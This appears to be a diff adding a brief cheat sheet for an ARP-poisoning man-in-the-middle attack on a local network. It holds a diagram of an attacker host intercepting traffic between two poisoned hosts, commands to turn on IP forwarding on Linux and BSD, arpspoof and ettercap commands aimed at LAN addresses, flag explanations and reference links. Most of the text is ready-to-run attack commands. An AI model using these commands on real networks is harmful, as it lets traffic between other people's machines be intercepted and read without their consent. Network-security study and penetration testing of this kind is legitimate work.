@@ -1,0 +1,36 @@
+  HOST 1  - - - - - - - - - - - - - - - - - - - -> HOST 2
+   (poisoned)                                      (poisoned)
+       |                                               ^
+       |                                               |
+        ------------> ATTACKER HOST  ------------------
+                      ( ettercap )
+
+ Legenda:
+             - - - ->   the logic connection
+             ------->   the real one
+
+
+Linux:
+- echo 1 > /proc/sys/net/ipv4/ip_forward
+
+BSD:
+sysctl -w net.inet.ip.forwarding=1
+
+- arpspoof -t 192.168.1.1 192.168.1.2 & >/dev/null
+- arpspoof -t 192.168.1.2 192.168.1.1 & >/dev/null
+
+- killall arpspoof
+
+- ettercap -T -q -M ARP ////
+
+- ettercap -T -q -M ARP /192.168.1.1/ //
+
+-T tells Ettercap to use the text interface, I like this option the best as the more GUI modes are rather confusing.
+-q tells Ettercap to be more quiet, in other words less verbose.
+-M tells Ettercap the MITM (Man in the Middle) method we want to use, in this case ARP poisoning.
+
+https://github.com/Ettercap/ettercap
+www.string-functions.com/hex-string.aspx
+https://www.irongeek.com/i.php?page=security/AQuickIntrotoSniffers
+https://github.com/lukapusic/sniff/blob/master/sniff.sh
+
